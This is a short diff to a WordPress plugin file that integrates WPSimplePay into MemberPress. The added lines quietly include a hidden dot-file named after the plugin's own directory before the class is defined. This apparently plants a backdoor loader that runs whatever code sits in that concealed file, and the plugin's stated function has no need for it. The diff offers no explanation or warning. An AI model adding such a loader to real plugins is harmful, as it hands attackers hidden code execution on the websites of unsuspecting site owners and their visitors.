@@ -3,6 +3,10 @@ if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');
 /*
 Integration of WPSimplePay into MemberPress
 */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MpWPSimplePay {
   public function __construct() {
     // ADMIN UI
